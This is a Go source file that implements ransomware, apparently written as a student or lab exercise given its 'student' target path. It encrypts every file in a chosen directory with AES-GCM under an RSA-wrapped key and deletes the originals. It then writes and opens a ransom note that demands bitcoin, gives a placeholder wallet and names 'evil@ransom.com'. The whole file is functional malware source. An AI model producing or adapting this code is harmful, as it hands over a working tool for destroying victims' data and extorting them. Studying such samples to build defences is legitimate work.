package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)


func main() {
	fmt.Println(" All your files have been encrypted.")
	fmt.Println(" To recover them, send 0.2 BTC to the wallet address below.")
	fmt.Println(" After payment, email your transaction ID to evil@ransom.com")
	fmt.Println("Your files will be unlocked. Do not turn off your computer.")

	// Load RSA public key
	pubKeyData, err := os.ReadFile("public.pem")
	if err != nil {
		panic(" Failed to load RSA public key: " + err.Error())
	}

	block, _ := pem.Decode(pubKeyData)
	if block == nil || block.Type != "PUBLIC KEY" {
		panic(" Failed to decode public key PEM")
	}
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		panic(" Failed to parse RSA public key: " + err.Error())
	}
	rsaPubKey := pubKey.(*rsa.PublicKey)

	// Generate random AES key
	aesKey := make([]byte, 32) // 256-bit key
	if _, err := rand.Read(aesKey); err != nil {
		panic(" Failed to generate AES key")
	}

	// Encrypt AES key with RSA public key
	encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPubKey, aesKey)
	if err != nil {
		panic(" Failed to encrypt AES key: " + err.Error())
	}

	// Save encrypted AES key to file
	err = os.WriteFile("ENCRYPTED_KEY.bin", encryptedKey, 0644)
	if err != nil {
		panic(" Failed to write encrypted AES key to file: " + err.Error())
	}

	// Setup AES-GCM
	blockCipher, err := aes.NewCipher(aesKey)
	if err != nil {
		panic(" Failed to initialize AES cipher")
	}
	gcm, err := cipher.NewGCM(blockCipher)
	if err != nil {
		panic(" Failed to initialize GCM mode")
	}

	// Directory to encrypt
	targetDir := "/home/student/Documents/secret-folder"

	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("  Error accessing path:", path, "-", err)
			return nil
		}
		if info == nil || info.IsDir() {
			return nil
		}

		// Skip .enc files
		if filepath.Ext(path) == ".enc" || filepath.Ext(path) == ".pem" || info.Name() == "ENCRYPTED_KEY.bin" {
			return nil
		}

		fmt.Println(" Encrypting:", path)

		// Read file
		data, err := os.ReadFile(path)
		if err != nil {
			fmt.Println(" Error reading file:", err)
			return nil
		}

		// Encrypt with AES-GCM
		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			fmt.Println(" Error generating nonce:", err)
			return nil
		}
		ciphertext := gcm.Seal(nonce, nonce, data, nil)

		// Write encrypted file
		err = os.WriteFile(path+".enc", ciphertext, 0644)
		if err == nil {
			os.Remove(path)
		} else {
			fmt.Println(" Error writing encrypted file:", err)
		}
		return nil
	})

	// Optionally open a ransom note in editor
	_ = os.WriteFile("README_RESTORE_FILES.txt", []byte(`Your files have been encrypted!
To recover them, send 2 BTC to the address:
bc1qexampleaddressformalice12345678

Then email evil@ransom.com with your transaction ID.

DO NOT DELETE THIS FILE. Your files will be lost forever.`), 0644)

	_ = exec.Command("xdg-open", "README_RESTORE_FILES.txt").Start()
}


